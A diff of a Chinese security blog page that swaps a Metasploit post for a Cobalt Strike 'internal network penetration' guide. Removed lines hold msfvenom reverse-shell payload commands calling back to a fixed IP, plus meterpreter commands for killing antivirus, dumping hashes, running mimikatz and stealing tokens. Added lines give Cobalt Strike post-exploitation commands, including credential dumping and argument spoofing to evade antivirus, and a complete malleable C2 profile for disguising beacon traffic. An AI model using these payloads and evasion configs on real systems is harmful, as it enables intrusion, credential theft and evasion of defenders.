@@ -15,20 +15,29 @@
 
 
 
-<meta name="description" content="1、文件目录目录所在位置：/usr/share/metasploit-framework/">
+<meta name="description" content="##1、CobaltStrike的启动 先开启服务端：./teamserver 192.168.0.108 123456  再启动客户端进行连接：./start.sh  也可以在windows上启动客户端进行连接      javaw -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+A">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Metasploit">
-<meta property="og:url" content="http://yoursite.com/2020/07/26/内网渗透之Metasploit/index.html">
+<meta property="og:title" content="CobaltStrike">
+<meta property="og:url" content="http://yoursite.com/2020/07/29/内网渗透之CobaltStrike/index.html">
 <meta property="og:site_name" content="obsetear">
-<meta property="og:description" content="1、文件目录目录所在位置：/usr/share/metasploit-framework/">
+<meta property="og:description" content="##1、CobaltStrike的启动 先开启服务端：./teamserver 192.168.0.108 123456  再启动客户端进行连接：./start.sh  也可以在windows上启动客户端进行连接      javaw -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+A">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/internet/msf1.jpg">
-<meta property="og:image" content="http://yoursite.com/internet/msf2.jpg">
-<meta property="og:updated_time" content="2020-07-27T11:27:19.039Z">
+<meta property="og:image" content="http://yoursite.com/internet/cs1.jpg">
+<meta property="og:image" content="http://yoursite.com/internet/cs2.jpg">
+<meta property="og:image" content="http://yoursite.com/internet/cs3.jpg">
+<meta property="og:image" content="http://yoursite.com/internet/cs4.jpg">
+<meta property="og:image" content="http://yoursite.com/internet/cs5.jpg">
+<meta property="og:image" content="http://yoursite.com/internet/cs6.jpg">
+<meta property="og:image" content="http://yoursite.com/internet/cs7.jpg">
+<meta property="og:image" content="http://yoursite.com/internet/cs8.jpg">
+<meta property="og:image" content="http://yoursite.com/internet/cs9.jpg">
+<meta property="og:image" content="http://yoursite.com/internet/cs10.jpg">
+<meta property="og:image" content="http://yoursite.com/internet/cs11.jpg">
+<meta property="og:updated_time" content="2020-07-31T10:36:00.885Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Metasploit">
-<meta name="twitter:description" content="1、文件目录目录所在位置：/usr/share/metasploit-framework/">
-<meta name="twitter:image" content="http://yoursite.com/internet/msf1.jpg">
+<meta name="twitter:title" content="CobaltStrike">
+<meta name="twitter:description" content="##1、CobaltStrike的启动 先开启服务端：./teamserver 192.168.0.108 123456  再启动客户端进行连接：./start.sh  也可以在windows上启动客户端进行连接      javaw -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+A">
+<meta name="twitter:image" content="http://yoursite.com/internet/cs1.jpg">
 
 <link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
@@ -60,7 +69,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>Metasploit | obsetear</title>
+<title>CobaltStrike | obsetear</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -260,11 +269,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-内网渗透之Metasploit" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-内网渗透之CobaltStrike" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2020/07/26/内网渗透之Metasploit/" class="article-date">
-      <time datetime="2020-07-25T16:00:00.000Z" itemprop="datePublished">2020-07-26</time>
+      <a href="/2020/07/29/内网渗透之CobaltStrike/" class="article-date">
+      <time datetime="2020-07-28T16:00:00.000Z" itemprop="datePublished">2020-07-29</time>
 </a>
 
 
@@ -279,7 +288,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      Metasploit
+      CobaltStrike
     </h1>
   
 
@@ -296,164 +305,194 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="1、文件目录"><a href="#1、文件目录" class="headerlink" title="1、文件目录"></a>1、文件目录</h2><pre><code>目录所在位置：/usr/share/metasploit-framework/</code></pre><a id="more"></a>    
-<pre><code>data目录：里面存放一些可编辑的文件
+        <p>##1、CobaltStrike的启动</p>
+<pre><code>先开启服务端：./teamserver 192.168.0.108 123456</code></pre><img src="/internet/cs1.jpg">
 
-documentation目录：文档目录，里面存放一些相关文档
+<pre><code>再启动客户端进行连接：./start.sh</code></pre><img src="/internet/cs2.jpg">
 
-lib目录：静态连接库目录
+<pre><code>也可以在windows上启动客户端进行连接
 
-modules目录：模块目录</code></pre><h2 id="2、基础使用"><a href="#2、基础使用" class="headerlink" title="2、基础使用"></a>2、基础使用</h2><pre><code>msfdb init：初始化并启动msf数据库
+    javaw -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar</code></pre><img src="/internet/cs3.jpg">
 
-msfconsole：开启msf
+<h2 id="2、工具条"><a href="#2、工具条" class="headerlink" title="2、工具条"></a>2、工具条</h2><img src="/internet/cs4.jpg">
 
-db_status：查看数据库状态
+<pre><code>连接另一个服务器
 
-help：查看帮助
+断开当前服务器
 
-exit：退出msf
+配置监听
 
-show：进行罗列模块
+切换为服务器节点图
 
-search：搜索模块
+切换成会话列表
 
-back：返回上一级
+切换成目标列表
 
-info：查看模块信息
+查看凭据
 
-show options：查看配置
+查看下载的文件
 
-set：设置一个值
+查看键盘记录
 
-exploit：执行模块
+查看屏幕截图
 
-jobs：查看工作
+生产载荷
 
-kill：杀死工作
+生产java攻击载荷
 
-使用kage实现界面化：
+生产宏
 
-    1）启动msf：msfconsole -q -x &apos;load msgrpc ServerHost=0.0.0.0 ServerPort=55552 User=obse Pass=123456&apos;</code></pre><img src="/internet/msf1.jpg">
+web传递攻击</code></pre><h2 id="3、后渗透命令"><a href="#3、后渗透命令" class="headerlink" title="3、后渗透命令"></a>3、后渗透命令</h2><pre><code>sleep：设置交互时间
 
-<pre><code>2）启动kage</code></pre><img src="/internet/msf2.jpg">
+shell/run：使用cmd执行命令
 
-<h2 id="3、信息收集"><a href="#3、信息收集" class="headerlink" title="3、信息收集"></a>3、信息收集</h2><pre><code>arp扫描模块 ———— auxiliary/scanner/discovery/arp_sweep
+execute：执行一个文件
 
-udp扫描模块 ———— auxiliary/scanner/discovery/udp _sweep
+powershell：执行powershell命令
 
-端口扫描模块 ———— auxiliary/scanner/portscan/tcp</code></pre><h2 id="4、msfvenom"><a href="#4、msfvenom" class="headerlink" title="4、msfvenom"></a>4、msfvenom</h2><pre><code>**常用参数**
+powerpick：不调用powershel执行powershell命令
 
-    -l：查看列表
+execute-assembly：执行一个.net程序
 
-    -p：指定payload
+pwd：查看目录
 
-    -f：指定输出格式
+cd：切换目录
 
-    -e: 指定编码方式
+file brower：以界面化的形式查看文件结构
 
-    -i：指定编码次数
+process list：以界面化的形式查看进程
 
-demo
+portscan：端口扫描
 
-    windows ———— msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=4444 -e x86/shikata_ ga_nai -i 5 -f exe &gt; 1.exe
+shinject：进程注入
 
-    linux ———— msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=4444 -f elf &gt; 1.elf</code></pre><h2 id="5、meterpreter"><a href="#5、meterpreter" class="headerlink" title="5、meterpreter"></a>5、meterpreter</h2><pre><code>**基本操作**
+ps：查看进程列表
 
-    background:返回
+getuid：查看用户信息
 
-    sessions -l：查看所有会话信息
+getprivs：查看用户详细权限
 
-    sessions -i：与指定的会话进行交互
+getsystem：尝试提权
 
-    pwd：查看目标当前目录
+hashdump：导出用户密码(加密)
 
-    lpwd：查看本地当前目录
+logonpasswords：尝试抓明文密码
 
-    cd：切换至目标指定目录
+argue：参数欺骗（绕过杀软）
+    用法：argue [command] [fake arguements]</code></pre><h2 id="4、联动msf（mc联动）"><a href="#4、联动msf（mc联动）" class="headerlink" title="4、联动msf（mc联动）"></a>4、联动msf（mc联动）</h2><pre><code>msf ——&gt; cs
 
-    lcd：切换至本机的指定目录
+    1）首先要有一个msf的监听会话
 
-    ls：列出目标的文件
+    2）使用msf中的指定模块
+        use exploit/windows/local/payload_inject
 
-    clearev：清理痕迹
+    3）设置payload等配置，设置payload时，最后的协议要与cs中的一样，端口也要一样</code></pre><img src="/internet/cs5.jpg">
 
-    download：将目标文件下载到本地
+<pre><code>    4）然后cs就能接收到msf传来的监听了
 
-    upload：将文件上传到目标
+cs ——&gt; msf
 
-    execute：在目标执行命令的功能
+    1)首先要有一个cs的监听会话
 
-         execute -f 1.exe -H(隐藏执行一个程序)
+    2）用msf开启一个监听</code></pre><img src="/internet/cs6.jpg">
 
-    ps：列出目标进程
+<pre><code>3）新建一个foreign htt类型的监听</code></pre><img src="/internet/cs7.jpg">
 
-    getuid：查看当前用户的身份
+<pre><code>4）然后cs会话派生给新建的msfshell监听</code></pre><img src="/internet/cs8.jpg">    
 
-    getprivs: 查看用户的权限
+<pre><code>5）最后msf就会收到监听了</code></pre><h2 id="5、cs流量加密（免杀）"><a href="#5、cs流量加密（免杀）" class="headerlink" title="5、cs流量加密（免杀）"></a>5、cs流量加密（免杀）</h2><pre><code>C2-profile
 
-    migrate：进程迁移命令
+    1）使用keytool生成.store文件
+        keytool -genkey -alias demo -keyalg RSA -validity 36500 -keystore demo.store</code></pre><img src="/internet/cs9.jpg">    
 
-    getpid：查看木马进程
-
-    shell：进入终端环境 
-
-        chcp 65001:更改编码，防止乱码
-
-    exit：退出终端环境
-
-    idletime:查看目标服务器空闲时间
-
-    sysinfo: 查看目标信息
-
-    kill:杀死目标主机的一个进程
-
-    shutdown:关机
-
-    reboot:重启
-
-    netstat：查看目标ip信息
-
-    getsystem:尝试提权（低版本的系统才能成功）
-
-**meterpreter下run命令的一些用法**
-
-    run killav:杀死杀毒软件
-
-    run hashdump:导出目标机的密码
-
-    run post/windows/wlan/wlan_ profile: 查看wifi密码
-
-    run vnc:实时屏幕监控
-
-    run webcam:开启一个摄像头
-
-    run post/windows/gather/checkvm:查看当前主机是否为虚拟机
-
-    run post/windows/manage/enable_rdp: 开启目标的3389
-
-**token窃取**
-
-    load incognito：加载incognito
-
-    list_tokens -u：列举token
-
-    impersonate_token：窃取一个指定token
-
-    steal_token 3306：从进程中窃取token
-
-**mimikatz模块获取密码**
-
-    load mimikatz：加载mimikatz模块
-
-    msv：获取登录密码的hash值
-
-    kerberos/wdigest/tspkg：抓取明文密码
-
-**更新**
-
-    apt update
-
-    apt install metasploit-framework</code></pre>
+<pre><code>    2）创建C2.profile文件，加入以下内容
+
+    set sample_name &quot;obse POS Malware&quot;;
+    set sleeptime &quot;5000&quot;; # use a ~30s delay between callbacks
+    set jitter    &quot;10&quot;;    # throw in a 10% jitter
+
+    set useragent &quot;Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0&quot;;
+
+    #设置证书，注意以下内容得和你之前生成的证书一样
+    https-certificate {
+        set CN       &quot;ob&quot;; 
+        set O        &quot;ob&quot;;   
+        set C        &quot;ob&quot;;
+        set L        &quot;ob&quot;;
+        set OU       &quot;ob&quot;;  
+        set ST       &quot;ob&quot;;
+        set validity &quot;365&quot;;
+    }
+    #设置，修改成你的证书名称和证书密码
+    code-signer{
+        set keystore &quot;demo.store&quot;;
+        set password &quot;123456&quot;;
+        set alias &quot;demo&quot;;
+    }
+
+    #指定DNS beacon不用的时候指定到IP地址
+    set dns_idle &quot;8.8.4.4&quot;;
+
+    #每个单独DNS请求前强制睡眠时间
+    set dns_sleep &quot;0&quot;;
+
+    #通过DNS上载数据时主机名的最大长度[0-255]
+    set maxdns    &quot;235&quot;;
+
+    http-post {
+        set uri &quot;/windebug/updcheck.php /aircanada/dark.php /aero2/fly.php /windowsxp/updcheck.php /hello/flash.php&quot;;
+
+        client {
+            header &quot;Accept&quot; &quot;text/plain&quot;;
+            header &quot;Accept-Language&quot; &quot;en-us&quot;;
+            header &quot;Accept-Encoding&quot; &quot;text/plain&quot;;
+            header &quot;Content-Type&quot; &quot;application/x-www-form-urltrytryd&quot;;
+
+            id {
+                netbios;
+                parameter &quot;id&quot;;
+            }
+
+            output {
+                base64;
+                prepend &quot;&amp;op=1&amp;id=vxeykS&amp;ui=Josh @ PC&amp;wv=11&amp;gr=backoff&amp;bv=1.55&amp;data=&quot;;
+                print;
+            }
+        }
+
+        server {
+            output {
+                print;
+            }
+        }
+    }
+
+    http-get {
+        set uri &quot;/updates&quot;;
+
+        client {
+            metadata {
+                netbiosu;
+                prepend &quot;user=&quot;;
+                header &quot;Cookie&quot;;
+            }
+        }
+
+        server {
+            header &quot;Content-Type&quot; &quot;text/plain&quot;;
+
+            output {
+                base64;
+                print;
+            }
+        }
+    }
+
+3）使用 ./c2lint C2.profile 命令测试profile文件是否可用（没有保错就是可用的）</code></pre><img src="/internet/cs10.jpg">
+
+<pre><code>4）重新启动cs：./teamserver 192.168.0.108 123456 ./C2.profile</code></pre><img src="/internet/cs11.jpg">
+
+<pre><code>5）之后再生成payload，监听就可以达到免杀的效果了</code></pre><h2 id="6、CS插件"><a href="#6、CS插件" class="headerlink" title="6、CS插件"></a>6、CS插件</h2><pre><code>https://www.cobaltstrike.com/aggressor-script/index.html</code></pre>
       
     </div>
     
@@ -461,13 +500,13 @@ demo
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2020/07/26/内网渗透之Metasploit/">Metasploit</a></p>
+        <p><span>本文标题:</span><a href="/2020/07/29/内网渗透之CobaltStrike/">CobaltStrike</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">obsem</a></p>
-        <p><span>发布时间:</span>2020-07-26, 00:00:00</p>
-        <p><span>最后更新:</span>2020-07-27, 19:27:19</p>
+        <p><span>发布时间:</span>2020-07-29, 00:00:00</p>
+        <p><span>最后更新:</span>2020-07-31, 18:36:00</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2020/07/26/内网渗透之Metasploit/" title="Metasploit">http://yoursite.com/2020/07/26/内网渗透之Metasploit/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2020/07/26/内网渗透之Metasploit/　　作者: obsem" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2020/07/29/内网渗透之CobaltStrike/" title="CobaltStrike">http://yoursite.com/2020/07/29/内网渗透之CobaltStrike/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2020/07/29/内网渗透之CobaltStrike/　　作者: obsem" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -479,16 +518,10 @@ demo
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2020/07/29/内网渗透之CobaltStrike/">
-                    CobaltStrike
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2020/07/25/内网渗透之windows基础/">
-                    Windows基础
+                <a href="/2020/07/26/内网渗透之Metasploit/">
+                    Metasploit
                 </a>
             </div>
         
@@ -500,7 +533,7 @@ demo
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1、文件目录"><span class="toc-number">1.</span> <span class="toc-text">1、文件目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2、基础使用"><span class="toc-number">2.</span> <span class="toc-text">2、基础使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3、信息收集"><span class="toc-number">3.</span> <span class="toc-text">3、信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4、msfvenom"><span class="toc-number">4.</span> <span class="toc-text">4、msfvenom</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5、meterpreter"><span class="toc-number">5.</span> <span class="toc-text">5、meterpreter</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#2、工具条"><span class="toc-number">1.</span> <span class="toc-text">2、工具条</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3、后渗透命令"><span class="toc-number">2.</span> <span class="toc-text">3、后渗透命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4、联动msf（mc联动）"><span class="toc-number">3.</span> <span class="toc-text">4、联动msf（mc联动）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5、cs流量加密（免杀）"><span class="toc-number">4.</span> <span class="toc-text">5、cs流量加密（免杀）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6、CS插件"><span class="toc-number">5.</span> <span class="toc-text">6、CS插件</span></a></li></ol>
         
     </div>
     <style>
@@ -536,7 +569,7 @@ demo
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"Metasploit　| obsetear　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"CobaltStrike　| obsetear　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -556,15 +589,13 @@ demo
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2020/07/29/内网渗透之CobaltStrike/" title="上一篇: CobaltStrike">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2020/07/25/内网渗透之windows基础/" title="下一篇: Windows基础">
+            <a href="/2020/07/26/内网渗透之Metasploit/" title="下一篇: Metasploit">
                 <i class="fa fa-angle-right"></i>
             </a>
         
